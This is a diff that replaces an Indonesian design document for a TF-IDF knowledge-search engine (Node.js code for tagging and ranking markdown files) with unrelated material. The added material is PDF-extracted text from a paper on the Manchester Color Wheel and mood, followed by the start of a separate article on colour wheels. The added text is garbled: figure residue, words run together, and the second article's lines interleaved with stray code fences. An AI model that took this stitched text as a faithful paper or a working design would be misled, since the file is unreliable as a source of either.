+## 12
+## 15
+## 18
+## 21
+## 0
+positive
+## (n=57)
+neutral
+## (n=29)
+negative
+## (n=118)
+[rho=0.456; p<0.001]
+## 3
+## 6
+## 9
+## 12
+## 15
+## 18
+## 21
+rho=0.255; p=0.017
+rho=0.106; p=0.329
+rho=0.292; p=0.010
+rho=0.095; p=0.413
+rho=0.226; p=0.155
+rho=0.275; p=0.082
+Figure 6Relationship between mean anxiety and depression scores and‘mood’color (positive, neutral or negative) in healthy,
+anxious and depressed volunteers in Permutations 1-3. Healthy subjects are shown in blue, anxious in orange and depressed in red. The
+appropriately colored dots indicate each individual’s HAD anxiety (top row of figures) or depression (bottom row of figures) score and the lines
+of a similar color show each groups mean score. The rho values written in black, represent the overall magnitude of the relationships of the
+three groups namely, healthy, anxious and depressed whereas the rhos written in red, orange and blue represent the individual groups. Optimal
+permutations were identified by those which best discriminated between the various subgroups and which displayed a greater strength of
+relationship between the degree of anxiety/depression and positive/negative colors for example, Permutation 7 & 8 were most marked in HAD
+depression in healthy volunteers (p = 0.008) and Permutation 4 was most marked for HAD anxiety in the anxious group (p = 0.001). Data was
+analysed using Spearman’s correlation.
+Carrutherset  al.BMC  Medical Research  Methodology2010,10:12
+http://www.biomedcentral.com/1471-2288/10/12
+Page 10 of 13
+
+the second. If the data are assessed using this criterion
+then reproducibility increases to 59%, 78% and 76%
+respectively. Another critical finding in this study was
+that the shade of a color was a very important factor.
+Consequently color groupings, such as reds, greens and
+yellows may not be a good way of assessing color prefer-
+ences. This is because it became clear from this study
+that a pale shade of a color may have a completely dif-
+ferent connotation to a much darker shade. For
+instance, dark blue may have similar mood or emotional
+connotations to dark brown rather than to a pale shade
+of blue. These problems can be overcome by adopting
+the alternative methodology of classifying a color as
+either positive or negative. When this was undertaken
+reproducibility reached extremely high values of 88%
+and 91% respectively for positive or negative shades sug-
+gesting that this approach may be much more robust
+than relying on individual color choice.
+When colors were assessed according to their positive
+and negative associations it was observed that there was
+a tendency for some colors, such as yellow or black, to
+be far more commonly rated as either positive or nega-
+tive than others. Thus, it was possible to create a variety
+of permutations which at one extreme were restricted to
+just the most highly rated positive or negative colors
+such as Permutation 8. Alternatively, a much more
+balanced permutation containing equal numbers of
+positive, neutral and negative colors such as Permuta-
+tion 4 resulted from attributing a positive or negative
+connotation to a far greater number of colors. It may be
+that for some studies colors with a very high positive or
+negative rating may be more appropriate whereas in
+other investigations a broader range of somewhat lower
+rated colors may be a better option.
+The effect of anxiety and depression on the different
+permutations of positive, neutral and negative colors
+was assessed. As can be seen from Figures 6 and 7, indi-
+viduals with anxiety and depression did show different
+patterns of color choice compared to each other as well
+as healthy subjects. These figures also show that nega-
+tivecolorsaremorelikelytobechosenbydepressed
+subjects and that in most cases the higher the depres-
+sion score the more likely they are to choose such a
+color. Another notable finding was that even in healthy
+volunteers with depression scores within the normal
+range those with higher scores more frequently chose a
+negative color.
+It is important that if the Color Wheel were to be
+used to help identify depression, that the majority of
+patients would need to choose a mood color for it to be
+effective in the clinical situation. However, our results
+indicate that a decline in mood does seem to provoke
+individuals to choose a color and even in depressed
+individuals who did not choose a color, the anxiety and
+HAD anxiety score
+HAD depression score
+HAD anxiety score
+HAD depression score
+HAD anxiety score
+HAD depression score
+## Permutation 4
+## Permutation 5 & 6
+## Permutation 7 & 8
+## 0
+positive
+## (n=21)
+neutral
+## (n=85)
+negative
+## (n=98)
+[rho=0.453; p<0.001]
+## 3
+## 6
+## 9
+## 12
+## 15
+## 18
+## 21
+## 0
+positive
+## (n=21)
+neutral
+## (n=85)
+negative
+## (n=98)
+[rho=0.471; p<0.001]
+## 3
+## 6
+## 9
+## 12
+## 15
+## 18
+## 21
+rho=0.248; p=0.020
+rho=0.203; p=0.059
+rho=0.305; p=0.007
+rho=0.035; p=0.766
+rho=0.252; p=0.111
+rho=0.365; p=0.019
+## 0
+positive
+## (n=37)
+neutral
+## (n=65)
+negative
+## (n=102)
+[rho=0.482; p<0.001]
+## 3
+## 6
+## 9
+## 12
+## 15
+## 18
+## 21
+## 0
+positive
+## (n=37)
+neutral
+## (n=65)
+negative
+## (n=102)
+[rho=0.478; p<0.001]
+## 3
+## 6
+## 9
+## 12
+## 15
+## 18
+## 21
+rho=0.295; p=0.005
+rho=0.211; p=0.049
+rho=0.377; p=0.001
+rho=0.105; p=0.368
+rho=0.268; p=0.091
+rho=0.278; p=0.078
+## 0
+[rho=0.447; p<0.001]
+## 3
+## 6
+## 9
+## 12
+## 15
+## 18
+## 21
+## 0
+positive
+## (n=15)
+neutral
+## (n=104)
+negative
+## (n=85)
+positive
+## (n=15)
+neutral
+## (n=104)
+negative
+## (n=85)
+[rho=0.454; p<0.001]
+## 3
+## 6
+## 9
+## 12
+## 15
+## 18
+## 21
+rho=0.227; p=0.035
+rho=0.119; p=0.273
+rho=0.282; p=0.014
+rho=0.092; p=0.431
+rho=0.205; p=0.198
+rho=0.412; p=0.008
+depressed (n=87)
+anxious (n=76)
+healthy (n=41)
+Figure 7Relationship between mean anxiety and depression scores and‘mood’color (positive, neutral or negative) in healthy,
+anxious and depressed volunteers in Permutations 4-8. Healthy subjects are shown in blue, anxious in orange and depressed in red. The
+appropriately colored dots indicate each individual’s HAD anxiety (top row of figures) or depression (bottom row of figures) score and the lines
+of a similar color show each groups mean score. The rho values written in black, represent the overall magnitude of the relationships of the
+three groups namely, healthy, anxious and depressed whereas the rhos written in red, orange and blue represent the individual groups. Optimal
+permutations were identified by those which best discriminated between the various subgroups and which displayed a greater strength of
+relationship between the degree of anxiety/depression and positive/negative colors for example, Permutation 7 & 8 were most marked in HAD
+depression in healthy volunteers (p = 0.008) and Permutation 4 was most marked for HAD anxiety in the anxious group (p = 0.001). Data was
+analysed using Spearman’s correlation.
+Carrutherset  al.BMC  Medical Research  Methodology2010,10:12
+http://www.biomedcentral.com/1471-2288/10/12
+Page 11 of 13
+
+depression scores were significantly lower than in those
+who chose a negative color irrespective of permutation.
+This suggests that as anxiety and depression gets worse
+theindividualismorelikelytochooseacolorto
+describe their mood. Therefore, the more anxious or
+depressed a person is, the more the Color Wheel
+approach is likely to identify the problem. Similar trends
+were also observed in healthy and anxious individuals
+although the differences did not always reach signifi-
+cance. The other remarkable observation from looking
+at Figures 6 and 7 is that it highlights the way there is a
+stepwise increase in anxiety and especially depression
+scores as individuals choose more neutral and then
+negative color shades. This seems to occur irrespective
+of whether individuals are healthy, anxious or depressed
+although it is most marked for healthy subjects and
+least apparent in the anxious and depressed group.
+## However,itshouldbenotedthatthedepressedindivi-
+duals already had relatively high scores and therefore a
+further stepwise increase in score would be less likely to
+occur as they were already scoring highly.
+Another aim of this study was to try and determine
+which permutation would be the best for use in future
+investigations. Regarding the relationship between mean
+anxiety and depression scores and positive, neutral and
+negative color choice, Permutation 4 was the best at
+detecting depression in truly depressed individuals. Like-
+wise, Permutation 4 was also best at detecting higher
+anxiety scores in both anxious and depressed indivi-
+duals. Permutations 7 and 8 performed best at detecting
+higher, although in the normal range, depression scores
+in healthy volunteers but did not perform well with
+regard to anxiety scores in this group of individuals. It
+therefore appears that Permutations 4, 7 and 8 are the
+most effective permutations although the latter two have
+a very restricted color choice and only work well in
+healthy individuals. It is probably better to choose the
+permutation that works best for those with a distorted
+color choice and thus Permutation 4 with its wider,
+more balanced distribution of positive, neutral and nega-
+tive colors and which works well both in anxious and
+depressed patients would appear to be the best choice.
+With regard to future studies, the Color Wheel
+approach could be used in children to detect affective
+disorders, as communication using color might be easier
+for them to understand than lengthy questionnaires that
+contain words they may not readily comprehend. The
+instrument would have to be revalidated in children as
+their response to color may differ to that of adults. The
+Color Wheel could also be used to help people with
+communication problems or those in whom English is
+not their first language. However, since the majority of
+the population examined in this study were white and of
+British origin, the results may not be readily transferable
+to groups from different cultural backgrounds. For
+example, in some Eastern cultures there is a strong pre-
+ference for the color white[32] which is in contrast to
+what was found in this study where white was seldom
+chosen. Thus the Color Wheel may need to be validated
+in different ethnic groups and this might even possibly
+reveal divergences in color preferences that hitherto
+may not have been recognised. Lastly, it has to be born
+in mind that many psychologically orientated question-
+naires are designed to detect either a normal or negative
+situation. In contrast, the Color Wheel is an instrument
+that not only can do that but also has the ability to
+identify a positive state of affairs.
+## Conclusion
+The Color Wheel provides an easy to use method of
+assessing color choice in relation to a variety of clinical
+situations and has the added advantage that it dispenses
+with the need for verbal communication.
+## Abbreviations
+CIE: Commission Internationale de l’Eclairage; HAD: Hospital Anxiety and
+## Depression Scale.
+## Acknowledgements
+We would like to thank Danny Pascale of The BabelColor Company
+dpascale@babelcolor.com for providing us with helpful advice and the CIE
+coordinates of the colors used in this study. The study was funded by the
+Gut Research Fund, South Manchester University Hospital NHS Foundation
+## Trust.
+Author details
+## 1
+Department of Medicine, University of Manchester, Manchester, UK.
+## 2
+Department of Medical Statistics, Wythenshawe Hospital, Manchester, UK.
+## 3
+Division of Clinical Psychology, School of Psychological Sciences, University
+of Manchester, Manchester, UK.
+## Authors’contributions
+HRC participated in the design of the study, collected and analysed all the
+data as well as drafting the manuscript. JM advised on the statistical analysis
+of the data and checked the accuracy of the final results. NT participated in
+the design of the study, acted as PhD supervisor to HRC and reviewed and
+critiqued the manuscript. PJW conceived the project and participated in its
+design as well as finalising the manuscript. All authors have read and
+approved the final manuscript.
+Competing interests
+The authors declare that they have no competing interests.
+## Received: 13 January 2009
+## Accepted: 9 February 2010 Published: 9 February 2010
+## References
+-   Carruthers HR, Miller V, Morris J, Evans J, Tarrier N, Whorwell PJ:Using art
+to help understand the imagery of irritable bowel syndrome and its
+response to hypnotherapy.Int  J  Clin  Exp  Hypn2009,57:162-173.
+-   Terwogt MM, Hoeksma JB:Color and emotions: preferences and
+combinations.J  Gen  Psychol1995,122:5-17.
+-   Eysenck HJ:A critical and experimental study of color preferences.Am  J
+## Psychol1941,45:385-394.
+-   Zentner MR:Preferences for colors and color-emotion combinations in
+early childhood.Dev  Sci2001,4:389-398.
+-   Wexner LB:The degree to which colors (hues) are associated with mood-
+tones.J  Appl  Psychol1954,38:432-435.
+Carrutherset  al.BMC  Medical Research  Methodology2010,10:12
+http://www.biomedcentral.com/1471-2288/10/12
+Page 12 of 13
+
+-   Schaie KW:Scaling the association between colors and mood-tones.Am
+## J  Psychol1961,74:266-273.
+-   Boyatzis CJ, Verghese R:Children’s emotional associations with colors.J
+## Genet  Psychol1994,155:77-85.
+-   Hemphill M:A note on adults’color-emotion associations.J  Genet  Psychol
+## 1996,157:275-280.
+-   Ou L, Luo MR, Woodcock A, Wright A:A study of color emotion and color
+preference. Part I: color emotions for single colors.Color  Res  Appl2004,
+## 29:232-240.
+-  Ou L, Luo MR, Woodcock A, Wright A:A study of color emotion and color
+preference. Part II: color emotions for two-color combinations.Color  Res
+## Appl2004,29:292-298.
+-  Ou L, Luo MR, Woodcock A, Wright A:A study of color emotion and color
+preference. Part III: color preference modelling.Color  Res  Appl2004,
+## 29:381-389.
+-  Simmons DR:The association of colors with emotions: a systematic
+approach [abstract].JVis2006,6:251a.
+-  Simmons DR, Asher K:The hedonics of color [abstract].JVis2007,7:463a.
+-  Schaie KW:The color pyramid test: a nonverbal technique for personality
+assessment.Psychol  Bull1963,60:530-547.
+-  Klopfer B, Davidson HH:The  Rorschach  Technique:  an  introductory  manual
+## New York: Harcourt, Brace & World, Inc 1962.
+-  Lüscher M:The  Lüscher  Color  Test.  Scott  IA,  editor  and  translatorNew York:
+## Washington Square Press 1969.
+-  Lowenfeld M:The Lowenfeld Mosaic Test.J  Proj  Tech1952,16:200-202.
+-  Stroop JR:Studies of interference in serial verbal reactions.J  Exp  Psychol
+## 1935,18:643-661.
+-  Zigmond AS, Snaith RP:The hospital anxiety and depression scale.Acta
+## Psychiatr  Scand1983,67:361-370.
+-  Scheffe H:The  analysis  of  varianceNew York: John Wiley and Sons 1959.
+-  Hogg J:A principal components analysis of semantic differential
+judgements of single colors and color pairs.J  Gen  Psychol1969,
+## 80
+## :129-140.
+-  Wijk H, Berg S, Sivik L, Steen B:Color discrimination, color naming and
+color preferences in 80-year olds.Aging  Clin  Exp  Res1999,11:176-185.
+-  Camgoz N, Yener C, Guvenc D:Effects of hue, saturation and brightness
+on preference.Color  Res  Appl2002,27:199-207.
+-  De Leo D, Rocco PL, Dello Buono MR, Dalla Barba GF:Grey mood: grey
+colors.Lancet1989,2:573-574.
+-  Goodwin FK, Jamison KR:Manic-depressive  illnessNew York: Oxford
+## University Press 1990, 16.
+-  Barrick CB, Taylor D, Correa EI:Color sensitivity and mood disorders:
+biology or metaphor?.J  Affect  Disord2002,68:67-71.
+-  Schaie KW:A Q-sort study of color-mood association.J  Proj  Tech1961,
+## 25:341-6.
+-  Nolan RF, Dai Y, Stanley PD:An investigation of the relationship between
+color choice and depression measured by the Beck Depression
+Inventory.Percep  Mot  Skills1995,81:1195-1200.
+-  Valdez P, Mehrabian A:Effects of color on emotions.J  Exp  Psychol  Gen
+## 1994,123:394-409.
+-  Hurlbert AC, Ling Y:Biological components of sex differences in color
+preference.Curr  Biol2007,17:R623-5.
+-  Beke L, Kutas G, Kwak Y, Sung GY, Park D, Bodrogi P:Color preference of
+aged observers compared to young observers.Col  Res  Appl2008,
+## 5:381-94.
+-  Saito M:Comparative studies on color preference in Japan and other
+Asian regions, with special emphasis on the preference for white.Color
+## Res  Appl1996,21:35-49.
+Pre-publication history
+The pre-publication history for this paper can be accessed here:http://www.
+biomedcentral.com/1471-2288/10/12/prepub
+doi:10.1186/1471-2288-10-12
+Cite this article as:Carrutherset  al.:The Manchester Color Wheel:
+development of a novel way of identifying color choice and its
+validation in healthy, anxious and depressed individuals.BMC  Medical
+## Research  Methodology201010:12.
+Submit your next manuscript to BioMed Central
+and take full advantage of:
+- Convenient online submission
+- Thorough peer review
+- No space constraints or color figure charges
+- Immediate publication on acceptance
+- Inclusion in PubMed, CAS, Scopus and Google Scholar
+- Research which is freely available for redistribution
+Submit your manuscript at
+www.biomedcentral.com/submit
+Carrutherset  al.BMC  Medical Research  Methodology2010,10:12
+http://www.biomedcentral.com/1471-2288/10/12
+Page 13 of 13
 
 ---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, tdd, vcs, api]
 
-## 🎯 Executive Summary
+### 📘 KNOWLEDGE: NEXUS_19JPICOLOUR.MD
 
-Sistem semantic search NEXUS saat ini menggunakan **regex string matching** untuk indexing dan retrieval knowledge dari HUB. Pendekatan ini mulai menjadi bottleneck di 30 project — dan akan **gagal secara signifikan** di 100 project ketika HUB berisi 200+ file wisdom.
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
 
-Dokumen ini mendefinisikan upgrade ke **TF-IDF Vector Search** yang ringan, tidak butuh cloud, dan bisa jalan optimal di RAM 8GB.
-
----
-
-## 🔍 Diagnosis Masalah Saat Ini
-
-### Problem 1: `getSemanticTags()` di NexusEngine.js
-
-```javascript
-// SEKARANG — Rapuh & terbatas
-async getSemanticTags(filePath) {
-    const content = await fs.readFile(filePath, 'utf8');
-    const match = content.match(/>\\s*\\*\\*METADATA.*\\[(.*)\\]/i);
-    if (match) {
-        return match[1].split(',').map(t => t.trim().toLowerCase());
-    }
-    return []; // ← Kalau file tidak punya metadata block = BLIND
-}
+JOURNAL OF PERCEPTUAL IMAGING, VOL. 2, NO. 1, JAN–JUN 2019 1
+Abstract—Colour wheels are a tool for ordering and understanding
+hue. Different colour wheels differ in the spacing of the colours around
+the wheel. The opponent colour theory, Munsell’s colour system, the
+standard printer’s primaries, the artist’s primaries, and Newton’s rainbow
+all present different variations of the colour wheel. I show that some of
+this variation is owing to imprecise use of language, based on Berlin
+and Kay’s theory of basic colour names. I also show that the artist’s
+colour wheel is an outlier that does not match well to the technical colour
+wheels because its principal colours are so strongly connected to the
+basic colour names.
+1 INTRODUCTION
+C
+OLOUR wheels provide a way to describe the ordering
+of hue and, in some cases, to aid understanding colour
 ```
-
-**Masalah**: Kalau file baru belum punya metadata block `NEXUS SEMANTIC TAGS`, fungsi ini return array kosong. Agent tidak bisa temukan file itu via semantic search — **invisible di HUB**.
-
----
-
-### Problem 2: `identifyCategory()` di Distiller.js
-
-```javascript
-// SEKARANG — Hardcoded keyword list
-identifyCategory(content) {
-    const tagMap = {
-        'security': ['auth', 'encryption', 'password', ...],
-        'database': ['query', 'schema', 'sql', ...],
-        // ...
-    };
-    // Ambil category PERTAMA yang match — bisa salah
-    for (const [tag, keywords] of Object.entries(tagMap)) {
-        if (keywords.some(kw => lowerContent.includes(kw))) return tag;
-    }
-    return 'other'; // ← Fallback kasar
-}
+mixing. The artist’s colour wheel (Figure 1), epitomised
 ```
-
-**Masalah**: File yang membahas "security in database queries" akan dikategorikan `security` saja, padahal relevan juga ke `database`. **Multi-label tidak didukung**.
-
----
-
-### Problem 3: `searchKnowledge()` di NexusEngine.js
-
-```javascript
-// SEKARANG — Hanya exact tag match
-async searchKnowledge(tag) {
-    const results = this.memory.semanticIndex[tag.toLowerCase()] || [];
-    return results; // ← Tidak ada ranking relevansi
-}
+by Itten [Itt70], is used extremely widely in teaching. Its
+primary colours are red, yellow and blue.This is the colour
+wheel that students meet in primary school. In this wheel,
+the opposite of blue is orange. When students meet more
+advanced material in colour theory, they find apparent con-
+tradictions. The printer’s colour wheel has primaries cyan,
+magenta, and yellow, which the student might be taught
+to understand as a refinement of blue, red, and yellow.
+But curiously for the student the colour labelled “blue”
+in the printer’s colour wheel is opposite to yellow, not to
+orange. In my own early introduction to colour, I found the
+art books’ insistence that orange was the opposite of blue
+conflicted with my observation that, in many works of art
+and design, yellow appeared to me to be the more apposite
+opposite. Further confusion comes to the student when they
+meet the opponent colour theory, in which there are four
 ```
-
-**Masalah**: Query `"session security"` tidak akan match file berlabel `"auth, oauth"` meskipun kontennya sangat relevan.
-
----
-
-## ✅ Solusi: TF-IDF Vector Engine
-
-### Kenapa TF-IDF, Bukan LLM Embedding?
-
-| Kriteria                 | TF-IDF                     | LLM Embedding       |
-| :----------------------- | :------------------------- | :------------------ |
-| RAM Usage                | ~50MB                      | ~2-4GB              |
-| Kecepatan indexing       | Milidetik                  | Detik per file      |
-| Akurasi                  | Baik untuk domain spesifik | Sangat baik         |
-| Butuh internet           | ❌ Tidak                   | ⚠️ Tergantung model |
-| Cocok untuk 8GB RAM      | ✅ Ya                      | ⚠️ Berat            |
-| Cocok untuk 100-500 file | ✅ Ideal                   | Overkill            |
-
-**Kesimpulan**: Untuk skala 100-500 file wisdom teknikal, TF-IDF adalah pilihan paling optimal. LLM embedding baru worth it di Phase 5+ ketika HUB mencapai ribuan file.
-
----
-
-## 📦 Instalasi
-
-```bash
-# Di root NEXUS AI
-npm install natural
+principal colours, with blue opposite yellow (Figure 3); and
 ```
-
-> `natural` adalah NLP library Node.js yang include TF-IDF, stemmer, dan tokenizer. Size: ~15MB. Zero external dependency.
-
----
-
-## 🔧 Implementasi
-
-### STEP 1 — Buat File Baru: `agent/core/SemanticEngine.js`
-
-Buat file baru ini sebagai modul standalone yang bisa dipanggil oleh `Distiller` dan `NexusEngine`.
-
-````javascript
-// agent/core/SemanticEngine.js
-// NEXUS Semantic Engine v1.0 — TF-IDF Based Knowledge Retrieval
-// Replaces regex-based tagging with intelligent vector scoring
-
-const natural = require("natural");
-const fs = require("fs-extra");
-const path = require("path");
-
-class SemanticEngine {
-  constructor(knowledgePath) {
-    this.knowledgePath = knowledgePath;
-    this.tfidf = new natural.TfIdf();
-    this.fileIndex = []; // [{ file, path, tags }]
-    this.isBuilt = false;
-
-    // Domain vocabulary untuk TALL Stack context
-    this.domainVocab = {
-      security: [
-        "auth",
-        "authentication",
-        "authorization",
-        "password",
-        "token",
-        "oauth",
-        "csrf",
-        "xss",
-        "encryption",
-        "bcrypt",
-        "guard",
-        "middleware",
-        "2fa",
-        "jwt",
-        "session",
-        "keamanan",
-        "sanctum",
-      ],
-      database: [
-        "migration",
-        "schema",
-        "eloquent",
-        "query",
-        "model",
-        "pivot",
-        "relationship",
-        "hasMany",
-        "belongsTo",
-        "index",
-        "uuid",
-        "foreign",
-        "seeders",
-        "factory",
-        "database",
-        "sql",
-      ],
-      "ui-ux": [
-        "livewire",
-        "alpine",
-        "blade",
-        "component",
-        "reactive",
-        "design",
-        "layout",
-        "tailwind",
-        "responsive",
-        "accessibility",
-        "modal",
-        "form",
-        "validation",
-        "frontend",
-        "estetika",
-        "wire:model",
-      ],
-      performance: [
-        "cache",
-        "redis",
-        "queue",
-        "job",
-        "optimize",
-        "lazy",
-        "eager",
-        "n+1",
-        "horizon",
-        "chunk",
-        "pagination",
-        "compression",
-        "cdn",
-        "index",
-        "performa",
-      ],
-      tdd: [
-        "test",
-        "pest",
-        "phpunit",
-        "assert",
-        "mock",
-        "factory",
-        "feature",
-        "unit",
-        "dusk",
-        "coverage",
-        "tdd",
-        "scaffold",
-        "pengujian",
-      ],
-      vcs: [
-        "git",
-        "commit",
-        "branch",
-        "merge",
-        "rebase",
-        "worktree",
-        "pull",
-        "push",
-        "conflict",
-        "tag",
-        "release",
-        "gitflow",
-      ],
-      saas: [
-        "tenant",
-        "subscription",
-        "billing",
-        "stripe",
-        "plan",
-        "feature-flag",
-        "multi-tenant",
-        "invoice",
-        "webhook",
-        "payment",
-        "saas",
-      ],
-      api: [
-        "api",
-        "rest",
-        "endpoint",
-        "resource",
-        "sanctum",
-        "throttle",
-        "versioning",
-        "response",
-        "request",
-        "webhook",
-        "integration",
-      ],
-    };
-  }
-
-  /**
-   * Build TF-IDF index dari semua file di knowledge HUB
-   * Dipanggil sekali saat startup atau setelah distill
-   */
-  async buildIndex() {
-    console.log("🔬 SemanticEngine: Building TF-IDF vector index...");
-
-    this.tfidf = new natural.TfIdf(); // Reset
-    this.fileIndex = [];
-
-    const glob = require("glob");
-    const files = glob.sync("**/*.{md,MD}", {
-      cwd: this.knowledgePath,
-      ignore: [
-        "NEXUS_HUB_INDEX.md",
-        "NEXUS_NEURAL_MAP.md",
-        "NEXUS_SEMANTIC_INDEX.json",
-      ],
-      nodir: true,
-    });
-
-    for (const file of files) {
-      const filePath = path.join(this.knowledgePath, file);
-      try {
-        const content = await fs.readFile(filePath, "utf8");
-        const cleaned = this.cleanContent(content);
-
-        this.tfidf.addDocument(cleaned);
-        this.fileIndex.push({
-          index: this.fileIndex.length,
-          file: file,
-          path: filePath,
-          tags: this.extractMultiTags(content),
-        });
-      } catch (e) {
-        // Skip file yang tidak bisa dibaca
-      }
-    }
-
-    this.isBuilt = true;
-
-    // Simpan index ke disk untuk reuse
-    await this.saveIndex();
-
-    console.log(
-      `   ✅ Index built: ${this.fileIndex.length} knowledge nodes vectorized.`,
-    );
-    return this.fileIndex.length;
-  }
-
-  /**
-   * Simpan index ke disk (cache)
-   */
-  async saveIndex() {
-    const indexPath = path.join(
-      this.knowledgePath,
-      "..",
-      "short_term",
-      "vector_index.json",
-    );
-    await fs.ensureDir(path.dirname(indexPath));
-    await fs.writeJson(
-      indexPath,
-      {
-        built_at: Date.now(),
-        file_count: this.fileIndex.length,
-        index: this.fileIndex,
-      },
-      { spaces: 2 },
-    );
-  }
-
-  /**
-   * Load index dari cache kalau masih fresh (< 1 jam)
-   */
-  async loadIndex() {
-    const indexPath = path.join(
-      this.knowledgePath,
-      "..",
-      "short_term",
-      "vector_index.json",
-    );
-    if (!(await fs.pathExists(indexPath))) return false;
-
-    const cached = await fs.readJson(indexPath);
-    const ageMs = Date.now() - cached.built_at;
-    const ONE_HOUR = 3600000;
-
-    if (ageMs < ONE_HOUR && cached.index.length > 0) {
-      this.fileIndex = cached.index;
-      this.isBuilt = true;
-      console.log(
-        `   ⚡ Vector index loaded from cache (${cached.file_count} nodes, ${Math.round(ageMs / 60000)}m old).`,
-      );
-      return true;
-    }
-    return false;
-  }
-
-  /**
-   * Search knowledge dengan TF-IDF scoring + domain vocab boost
-   * @param {string} query - Natural language query atau tag
-   * @param {number} topK - Jumlah hasil teratas
-   * @returns {Array} - Sorted results dengan score
-   */
-  async search(query, topK = 5) {
-    if (!this.isBuilt) {
-      const cached = await this.loadIndex();
-      if (!cached) await this.buildIndex();
-    }
-
-    const results = [];
-    const queryLower = query.toLowerCase();
-
-    // TF-IDF scoring
-    this.tfidf.tfidfs(query, (i, measure) => {
-      if (measure > 0 && this.fileIndex[i]) {
-        results.push({
-          ...this.fileIndex[i],
-          score: measure,
-        });
-      }
-    });
-
-    // Domain vocab boost — tambahkan score kalau query match domain keyword
-    for (const result of results) {
-      for (const [domain, keywords] of Object.entries(this.domainVocab)) {
-        const domainMatch = keywords.some((kw) => queryLower.includes(kw));
-        const fileMatch = result.tags.includes(domain);
-        if (domainMatch && fileMatch) {
-          result.score *= 1.5; // 50% boost untuk exact domain match
-        }
-      }
-    }
-
-    // Sort by score descending, ambil top K
-    return results.sort((a, b) => b.score - a.score).slice(0, topK);
-  }
-
-  /**
-   * Extract multi-label tags dari konten file
-   * Lebih akurat dari identifyCategory() karena support multi-tag
-   */
-  extractMultiTags(content) {
-    const lowerContent = content.toLowerCase();
-    const tags = new Set();
-
-    // 1. Cek existing NEXUS metadata tags dulu
-    const metaMatch = content.match(/METADATA.*\[([^\]]+)\]/i);
-    if (metaMatch) {
-      metaMatch[1].split(",").forEach((t) => tags.add(t.trim().toLowerCase()));
-    }
-
-    // 2. Score setiap domain berdasarkan keyword frequency
-    for (const [domain, keywords] of Object.entries(this.domainVocab)) {
-      const hits = keywords.filter((kw) => lowerContent.includes(kw)).length;
-      const threshold = Math.max(2, Math.floor(keywords.length * 0.15));
-      if (hits >= threshold) {
-        tags.add(domain);
-      }
-    }
-
-    return Array.from(tags);
-  }
-
-  /**
-   * Bersihkan markdown menjadi plain text untuk indexing
-   */
-  cleanContent(content) {
-    return content
-      .replace(/```[\s\S]*?```/g, "") // hapus code blocks
-      .replace(/#{1,6}\s/g, "") // hapus heading markers
-      .replace(/\[([^\]]+)\]\([^)]+\)/g, "$1") // hapus links, keep text
-      .replace(/[*_`>]/g, "") // hapus markdown formatting
-      .replace(/\n+/g, " ") // normalize newlines
-      .trim();
-  }
-
-  /**
-   * Invalidate cache — panggil setelah nexus distill
-   */
-  async invalidateCache() {
-    const indexPath = path.join(
-      this.knowledgePath,
-      "..",
-      "short_term",
-      "vector_index.json",
-    );
-    if (await fs.pathExists(indexPath)) {
-      await fs.remove(indexPath);
-      this.isBuilt = false;
-      console.log(
-        "   🗑️  Vector index cache invalidated. Will rebuild on next search.",
-      );
-    }
-  }
-}
-
-module.exports = SemanticEngine;
-````
-
----
-
-### STEP 2 — Update `NexusEngine.js`
-
-Tambahkan import dan replace `searchKnowledge()`:
-
-```javascript
-// TAMBAHKAN di bagian import (baris atas NexusEngine.js)
-const SemanticEngine = require('./SemanticEngine');
-
-// TAMBAHKAN di constructor NexusEngine, setelah this.distiller = ...
-this.semanticEngine = new SemanticEngine(this.knowledgePath);
-
-// GANTI fungsi searchKnowledge() yang lama dengan ini:
-async searchKnowledge(query, topK = 5) {
-    // Coba vector search dulu
-    try {
-        const results = await this.semanticEngine.search(query, topK);
-        if (results.length > 0) {
-            this.log(
-                `🔎 Vector Search [${query}]: Found ${results.length} relevant documents. ` +
-                `Top: ${results[0].file} (score: ${results[0].score.toFixed(2)})`,
-                'success'
-            );
-            return results.map(r => r.file);
-        }
-    } catch (e) {
-        this.log(`⚠️ Vector search failed, falling back to tag index: ${e.message}`, 'warning');
-    }
-
-    // Fallback ke regex tag index (backward compatible)
-    if (!this.memory.semanticIndex) await this.readMemory();
-    const fallback = this.memory.semanticIndex[query.toLowerCase()] || [];
-    return fallback;
-}
+Munsell’s colour system in which there are five principal
 ```
-
----
-
-### STEP 3 — Update `Distiller.js`
-
-Replace `identifyCategory()` dengan versi yang pakai `SemanticEngine`:
-
-```javascript
-// TAMBAHKAN di bagian import Distiller.js
-const SemanticEngine = require('./SemanticEngine');
-
-// TAMBAHKAN di constructor Distiller
-this.semanticEngine = new SemanticEngine(knowledgePath);
-
-// GANTI identifyCategory() dengan ini:
-identifyCategory(content) {
-    // Gunakan SemanticEngine.extractMultiTags untuk multi-label
-    const tags = this.semanticEngine.extractMultiTags(content);
-    // Return primary tag (pertama) untuk backward compat dengan shelve()
-    return tags.length > 0 ? tags[0] : 'other';
-}
-
-// TAMBAHKAN method baru setelah identifyCategory():
-identifyCategories(content) {
-    // Return semua tags (multi-label) — dipakai untuk semantic tagging
-    return this.semanticEngine.extractMultiTags(content);
-}
-
-// UPDATE applySemanticTagging() — ganti identifyCategory() dengan identifyCategories():
-async applySemanticTagging() {
-    console.log('🏷️ Distiller: Applying Multi-Label Semantic Tagging (Vector-Enhanced)...');
-    const files = this.getFiles();
-
-    for (const file of files) {
-        const filePath = path.join(this.knowledgePath, file);
-        let content = await fs.readFile(filePath, 'utf8');
-
-        // Gunakan multi-label detection
-        const foundTags = this.identifyCategories(content);
-
-        if (foundTags.length > 0) {
-            const tagStr = `\n\n---\n> **METADATA (NEXUS SEMANTIC TAGS)**: [${foundTags.join(', ')}]\n`;
-            if (!content.includes('METADATA (NEXUS SEMANTIC TAGS)')) {
-                content += tagStr;
-                await this.updateVersionHeader(filePath, content);
-                console.log(`   ✅ Tagged: ${file} with [${foundTags.join(', ')}]`);
-            }
-        }
-    }
-}
-
-// TAMBAHKAN di akhir method run(), setelah generateNeuralMap():
-async run() {
-    await this.distillAcademics();
-    await this.standardizeNames();
-    await this.applySemanticTagging();
-    await this.shelve();
-    await this.applySemanticLinking();
-    await this.generateHubIndex();
-    await this.generateNeuralMap();
-
-    // BARU: Rebuild vector index setelah distillation selesai
-    await this.semanticEngine.invalidateCache();
-    await this.semanticEngine.buildIndex();
-    console.log('🧠 Vector index rebuilt after distillation.');
-}
+hues, with blue opposite yellow-red (Figure 4). The chal-
 ```
-
----
-
-## 🧪 Cara Test Implementasi
-
